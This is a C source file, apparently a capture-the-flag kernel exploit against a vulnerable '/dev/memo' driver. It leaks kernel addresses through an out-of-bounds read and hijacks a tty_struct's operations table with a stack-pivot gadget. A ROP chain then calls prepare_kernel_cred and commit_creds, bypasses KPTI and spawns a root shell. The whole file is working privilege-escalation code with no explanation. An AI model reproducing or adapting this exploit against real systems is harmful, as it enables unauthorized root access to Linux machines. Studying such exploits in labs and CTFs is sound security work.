#define read(...)   syscall(0,   __VA_ARGS__)
#define write(...)  syscall(1,   __VA_ARGS__)
#define open(...)   syscall(2,   __VA_ARGS__)
#define close(...)  syscall(3,   __VA_ARGS__)
#define lseek(...)  syscall(8,   __VA_ARGS__)
#define ioctl(...)  syscall(16,  __VA_ARGS__)
#define execve(...) syscall(59,  __VA_ARGS__)
#define exit(...)   syscall(60,  __VA_ARGS__)

#define log(var) print(#var ": "); print_hex(var, 8); print("\n")

long syscall(long number, ...) {
    __asm__(
        "mov rax, %0\n"
        "mov rdi, rsi\n"
        "mov rsi, rdx\n"
        "mov rdx, rcx\n"
        "mov r10, r8\n"
        "mov r8, r9\n"
        "syscall"
        :: "a" (number)
    );
}

void print(char *str) {
    for (int i = 0; ; i++) {
        if (str[i] == '\0') {
            break;
        }
        write(1, str + i, 1);
    }
}

void print_hex(unsigned long value, unsigned long len) {
    char buf[19] = "0x";
    for (int i = len * 2 - 1; i >= 0; i--, value>>=4) {
        int x = value & 0xf;
        buf[i + 2] = x + (x <= 9 ? '0' : 'a' - 10);
    }
    buf[len * 2 + 2] = '\0';
    print(buf);
}

void hex_dump(unsigned long *mem, unsigned long size) {
    for (int i = 0; i < (size + 7) / 8; i++) {
        if (i % 2 == 0) {
            if (i > 0) {
                print("\n");
            }
            print_hex(i * 8, 2);
        }
        print(" ");
        print_hex(mem[i], 8);
    }
    print("\n");
}

void run_shell(void) {
    char *argv[2] = { "/bin/sh" };
    execve(argv[0], argv, 0);
}

struct {
    void *rip;
    unsigned long cs;
    unsigned long rflags;
    void *rsp;
    unsigned long ss;
} frame;

void save_frame(void) {
    __asm__("mov %q0, cs" : "=r" (frame.cs));
    __asm__("mov %q0, ss" : "=r" (frame.ss));
    __asm__("mov %q0, rsp" : "=r" (frame.rsp));
    __asm__("pushfq");
    __asm__("pop %q0" : "=r" (frame.rflags));
    frame.rip = run_shell;
}

void _start(void) {
    save_frame();

    char c;
    unsigned long buf[0x80];
    int fd = open("/dev/memo", 2);
    int ptmxfd = open("/dev/ptmx", 2);

    lseek(fd, 0x3f0, 0);
    read(fd, buf, 0x400);
    // hex_dump(buf, 0x400);

    unsigned long tty_struct_addr = buf[10] - 0x38;
    log(tty_struct_addr);
    unsigned long kbase = buf[0x4c] - 0x40f6b0;
    log(kbase);

    unsigned long commit_creds = kbase + 0x7b8b0;
    unsigned long prepare_kernel_cred = kbase + 0x7bb50;
    unsigned long push_r12_pop_rsp_r13 = kbase + 0x94d4e3;
    unsigned long pop_rdi = kbase + 0x1268;
    unsigned long mov_rdi_rax_rep = kbase + 0x19dcb;
    unsigned long pop_rcx = kbase + 0x4c852;
    unsigned long bypass_pti = kbase + 0xa00a45;

    unsigned long fake_ops[0x20] = {0};
    fake_ops[12] = push_r12_pop_rsp_r13;
    lseek(fd, 0, 0);
    write(fd, fake_ops, 0x100);

    unsigned long rop[0x20];
    unsigned long *rop_addr = rop;
    *rop_addr++ = 0;
    *rop_addr++ = pop_rdi;
    *rop_addr++ = 0;
    *rop_addr++ = prepare_kernel_cred;
    *rop_addr++ = pop_rcx;
    *rop_addr++ = 0;
    *rop_addr++ = mov_rdi_rax_rep;
    *rop_addr++ = commit_creds;
    *rop_addr++ = bypass_pti;
    *rop_addr++ = 0;
    *rop_addr++ = 0;
    *rop_addr++ = frame.rip;
    *rop_addr++ = frame.cs;
    *rop_addr++ = frame.rflags;
    *rop_addr++ = frame.rsp;
    *rop_addr++ = frame.ss;
    write(fd, rop, 0x100);

    unsigned long *fake_tty_struct = buf + 2;
    fake_tty_struct[3] = tty_struct_addr - 0x400;
    lseek(fd, 0x3f0, 0);
    write(fd, fake_tty_struct - 2, 0x100);

    ioctl(ptmxfd, 0xdeadbeef, tty_struct_addr - 0x300);

    exit(0);
}
